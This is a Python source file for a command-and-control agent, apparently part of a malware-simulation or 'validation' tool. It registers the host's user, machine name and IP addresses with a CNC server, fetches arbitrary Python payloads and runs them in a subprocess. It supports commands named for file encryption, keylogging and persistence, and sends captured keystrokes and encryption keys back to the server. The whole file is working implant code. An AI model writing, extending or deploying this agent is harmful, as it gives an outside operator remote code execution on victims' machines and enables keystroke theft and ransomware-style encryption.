import json
import os
import platform
import socket
import time
from enum import Enum
import requests
import subprocess

from Utilities.IpUtilities import get_ip_tuple
from Utilities.ImportSolver import *

# Constants
CNC_DOMAIN = "192.168.20.1:5000" # TODO: Change this to your CNC IP / Domain
UPDATE_COMMAND_API_ENDPOINT = "/api/set_command_status"
REGISTER_AGENT_ENDPOINT = "/api/agentregister"
GET_NEW_JWT_ENDPOINT = "/api/getpermanentjwt"
PULL_COMMANDS_ENDPOINT = "/api/pull_commands_requests"


class CommandEnum(Enum):
    ENCRYPT_FILE = 0
    KEY_LOGGING = 1
    SET_PERSISTENCE = 2

# Utilities


def compile_and_run_code_new_process(code):
    # Verify that the code we received can be executed
    compiled_code_object = compile(code, "tmpfile", "exec")

    # Parse and install missing packages
    resolve_imports(code)

    process_object = subprocess.Popen(['python', '-c', code])
    return process_object


def is_validator_registered():
    return os.path.exists("jwt.bin")


def load_jwt():
    jwt = None
    with open("jwt.bin", "r") as fi:
        jwt = json.load(fi)
    return jwt

# APIs


def register_validator_agent():

    os_type = platform.system()

    if platform.system() == "Windows":
        machine_name = os.environ['COMPUTERNAME']
        user_name = os.environ['USERNAME']
    else:
        machine_name = socket.gethostname()
        user_name = os.environ['USER']

    pretty_name = f"{user_name}_{machine_name}_agent_{os_type}"

    response = requests.post(f"http://{CNC_DOMAIN}{REGISTER_AGENT_ENDPOINT}",
                  headers={'Content-Type': 'application/json'},
                  data=json.dumps({
                      "os_type": platform.system(),
                      "local_ip": get_ip_tuple()[0],
                      "public_ip": get_ip_tuple()[1],
                      "pretty_name": pretty_name,
                  })
                  )
    if response.status_code == 200:
        with open("jwt.bin", "w") as fi:
            fi.write(json.dumps(response.json()))
    else:
        raise Exception("Bad response for registerValidator")


def pull_commands(jwt):
    response = requests.post(f"http://{CNC_DOMAIN}{PULL_COMMANDS_ENDPOINT}",
                             headers={
                                 'Content-Type': 'application/json',
                                 'Authorization': f'bearer {jwt}',

                                }
                             )
    if response.status_code == 200:
        return response.json()
    else:
        return None


def get_new_jwt_token(uuid, password):
    response = requests.post(f"http://{CNC_DOMAIN}{GET_NEW_JWT_ENDPOINT}",
                             headers={'Content-Type': 'application/json'},
                             data=json.dumps({"agent_id": uuid, "password": password})
                             )
    if response.status_code == 200:
        return response.json()["token"]
    else:
        return None


def main():
    if not is_validator_registered():
        register_validator_agent()
    jwt_object = load_jwt()

    while True:
        print(f"[+] Going to sleep for 5 seconds")
        time.sleep(5)
        print(f"[+] Pulling commands")
        commands_object = pull_commands(jwt_object["jwt"])
        print(f"[+] Pulled command_object => {commands_object}")

        output_payload = ""

        if commands_object is not None and\
                "commands_count" in commands_object and\
                commands_object["commands_count"] > 0 and\
                len(commands_object["commands_list"]) > 0:
            for command_object in commands_object["commands_list"]:

                if os.path.exists("actions_cap.txt"):
                    os.remove("actions_cap.txt")

                if os.path.exists("key.txt"):
                    os.remove("key.txt")

                print(f"command_object => {command_object}")

                run_exception = ""

                try:
                    process_object = compile_and_run_code_new_process(command_object["commandPayload"])

                    # We wait for 10 seconds and then terminate the process
                    time.sleep(10)
                    process_object.kill()

                except Exception as e:
                    run_exception = str(e)
                    print("[-] Exception was thrown -> {}".format(e))


                # For keylogging
                if os.path.exists("actions_cap.txt"):
                    print(f"actions_cap.txt exists!")
                    with open("actions_cap.txt") as fi:
                        output_payload = fi.read()

                # For encrypting
                if os.path.exists("key.txt"):
                    print(f"key.txt exists!")
                    with open("key.txt") as fi:
                        output_payload = fi.read()

                resp = requests.post(f"http://{CNC_DOMAIN}{UPDATE_COMMAND_API_ENDPOINT}",
                                     headers={'Content-Type': 'application/json',
                                              'Authorization': f'bearer {jwt_object["jwt"]}'},
                                     data=json.dumps({
                                         "command_request_id": command_object["commandId"],
                                         "command_request_result": output_payload,
                                         "command_request_error": run_exception
                                     })
                                     )

                if resp.status_code == 200:
                    print("[+] Updated the test command status successfully")
                    print(f"[+] output_payload => {output_payload}")
                else:
                    print("[-] Something went wrong while trying to update the status of the test command")


if '__main__' == __name__:
    main()
